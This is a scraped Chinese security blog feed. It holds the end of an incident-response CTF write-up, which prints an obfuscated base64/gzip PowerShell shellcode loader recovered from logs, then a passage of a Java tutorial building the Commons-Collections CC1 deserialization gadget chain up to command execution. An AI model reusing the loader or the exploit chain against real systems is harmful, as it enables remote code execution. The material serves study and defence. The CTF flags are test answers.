System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#x27;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&#123;0&#125;&#x27;)-f&#x27;A&#x27;,&#x27;f&#x27;,&#x27;M&#x27;)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) </span><br><span class="line">  ScriptBlockId 5ef6ec2a-3ad1-4051-8fba-a804b7bddefb </span><br><span class="line">  Path  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微问一下AI</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135320255.png" class="" title="图片引用方法一"><p>其实自己也看得出来，其中的关键VirtualProtect，Invoke，kernel32.dll其实可以猜出来，相当于免杀的混淆，base64解码后执行shellcode。</p><p>同时也发现了System.IO.Compression.GzipStream</p><p>根据时间判断，应该是先gz压缩，再base64</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135841104.png" class="" title="图片引用方法一"><p>导出看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140034813.png" class="" title="图片引用方法一"><p>导出为bin文件然后丢微步之类的看看。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140152237.png" class="" title="图片引用方法一"><p>恶意文件实锤了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d72000ee7388d7d58960db277a91cc40&#125;</span><br></pre></td></tr></table></figure><h2 id="综合应急"><a href="#综合应急" class="headerlink" title="综合应急"></a>综合应急</h2><h3 id="综合应急-1"><a href="#综合应急-1" class="headerlink" title="综合应急-1"></a>综合应急-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">综合应急-1请点击左上角“CTF”按钮切换为“知识竞赛”进行答题。题目类型为选择题，提交机会只有一次，请慎重提交。</span><br><span class="line">本题 flag答案为flag&#123;solar&#125;</span><br></pre></td></tr></table></figure><h3 id="综合应急-2"><a href="#综合应急-2" class="headerlink" title="综合应急-2"></a>综合应急-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">攻击者上传了代理工具，请写出他的最终存放路径</span><br><span class="line">格式为flag&#123;x:\xxxxx\xxxx\xxxxxx&#125;</span><br></pre></td></tr></table></figure><p>FOG 是一个用于部署计算机镜像的管理工具，特别是在网络中快速部署操作系统和应用程序。通过 FOG，管理员可以对计算机进行远程安装、恢复和管理。这对于大规模部署、维护和备份计算机非常有用。</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化CC1链分析</title>
      <link href="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1链-分析"><a href="#CC1链-分析" class="headerlink" title="CC1链 分析"></a>CC1链 分析</h1><p><strong>环境要求：jdk8u65，Commons-Collections 3.2.1</strong></p><ul><li>首先我们再次明确一下反序列化的攻击思路。</li></ul><p>入口类这里，我们需要一个 <code>readObject</code> 方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。</p><img src="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AttackRoad.png" alt="img" style="zoom:80%;" /><p><strong>Common-Collections介绍</strong></p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><ul><li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li></ul><h2 id="终点-利用点"><a href="#终点-利用点" class="headerlink" title="终点-利用点"></a>终点-利用点</h2><p>CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194118934.png" class="" title="This is an example image"><p>快捷键ctrl+alt+B，查看实现接口的类</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194436449.png" class="" title="This is an example image"><p>我们这里找到了有重写transform方法的InvokerTransformer类，并且可以看到它也继承了Serializable,很符合我们的要求。</p><p>下面给出InvokerTransformer类的构造器和重写的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = <span class="literal">null</span>;</span><br><span class="line">        iArgs = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边的参数都是可控的，同时重写的transform方法可以调用任意类的任意方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里我们回顾一下如何用反射调用Runtime的exec</span></span><br><span class="line">Runtime r=Runtime.getRuntime();<span class="comment">//Runtime.getRuntime() 是 Runtime 类中的一个静态方法，用来获取当前应用程序运行时的 Runtime 实例。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>=r.getClass();</span><br><span class="line">Method m=c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来尝试用transform来调用</span></span><br><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">invokerTransformer.transform(r);</span><br><span class="line"></span><br><span class="line"><span class="comment">//总结:比较上面两种方式，下面的transform相当于模拟了上述的反射过程。</span></span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105195833535.png" class="" title="This is an example image"><p>这里成功执行了命令，那么现在我们已经寻到入口点了，接下来需要一步步回溯，寻找合适的子类，构造漏洞链，直到到达重写了readObject的类。</p><p>所以我们下一步的目标是去找调用 <code>transform</code> 方法的不同名函数。</p><h2 id="构造链子第一步-寻找transform调用处"><a href="#构造链子第一步-寻找transform调用处" class="headerlink" title="构造链子第一步-寻找transform调用处"></a>构造链子第一步-寻找transform调用处</h2><p><strong>寻找哪些类中的哪些方法调用了transform方法</strong></p><p>右键查看用法即可</p><p>那么我们这里直接看到我们需要的TransformedMap类下的checkSetValue方法</p><p>下面我们直接给出构造器和checkSetValue方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#TransformedMap.java   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">   &#125;<span class="comment">//接受参数，实例化TransformedMap这个类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;<span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;<span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象。相当于就是让这里的valueTransformer=invokerTransformer！！！</span></span><br></pre></td></tr></table></figure><p>但是这里我们发现构造器和checkSetValue方法都是protected权限的，只能本类内部访问，无法外部调用和实例化，那么我们就需要找到内部实例化的工具。也就是上面的一个public静态方法decorate。</p><p>我们可以通过调用decorate方法来实例化TransformedMap类，然后再想办法调用checkSetValue方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">checkSetValueMethod.invoke(transformedmap,r);</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105202442609.png" class="" title="This is an example image"><h2 id="构造链子第二步-寻找checkSetValue调用处"><a href="#构造链子第二步-寻找checkSetValue调用处" class="headerlink" title="构造链子第二步-寻找checkSetValue调用处"></a>构造链子第二步-寻找checkSetValue调用处</h2><p>checkSetValue寻找用法，发现只有一处调用了checkSetValue(AbstractInputCheckedMapDecorator类的setValue)</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105204710172.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/** The parent map */</span></span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">           <span class="built_in">super</span>(entry);</span><br><span class="line">           <span class="built_in">this</span>.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105205232375.png" class="" title="This is an example image"><p>而上面副类MapEntry实际上是重写了setValue方法，它继承了AbstractMapEntryDecorator这个类，这个类中存在setValue方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapEntryDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Map.Entry entry;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这个类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法,然后水到渠成地调用checkSetValue方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Runtime r=Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// invokerTransformer.transform(r); &lt;--- 相当于下面的代码是模拟这行代码，实现相同的功能</span></span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;meteorkai&quot;</span>,<span class="string">&quot;meteorkai&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line">Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"><span class="comment">//后面是要调用checkSetValue方法，那么可以通过遍历Map来调用setValue方法,然后水到渠成调用checkSetValue方法</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedmap.entrySet())&#123;<span class="comment">//遍历Map常用格式</span></span><br><span class="line">    entry.setValue(r);<span class="comment">//调用setValue方法，并把对象r当作对象传入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105210341164.png" class="" title="This is an example image"><p>到这里我们先重头理一下：</p><p>首先，我们找到了TransformedMap这个类，我们需要调用它的checkSetValue方法从而来调用transform方法，但是这个类的构造器和checkSetValue方法都是protected权限，只能从类中访问，所以我们需要用decorate方法来实例化这个类。在此之前我们需要实例化一个hashmap，因为decorate方法中需要传入，并且调用put方法给他赋值以便他遍历map从而调用setValue方法。然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰巧又遇到了重写的setValue的副类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环。</p><p>但这只是一个小插曲，终究不是我们所希望的readObject方法，我们需要一个readObject方法来代替上述的遍历Map功能。</p><h2 id="构造链子第三步-寻找setValue调用处-链首"><a href="#构造链子第三步-寻找setValue调用处-链首" class="headerlink" title="构造链子第三步-寻找setValue调用处-链首"></a>构造链子第三步-寻找setValue调用处-链首</h2><p><strong>如果能找到一个 <code>readObject()</code> 里面调用了 <code>setValue()</code> 就太好了</strong></p><p>老样子，setValue寻找用法。我勒个豆，直接发现一个调用了setValue的readObject方法。很完美的实现了代替之前Map遍历功能</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105214636730.png" class="" title="This is an example image"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title 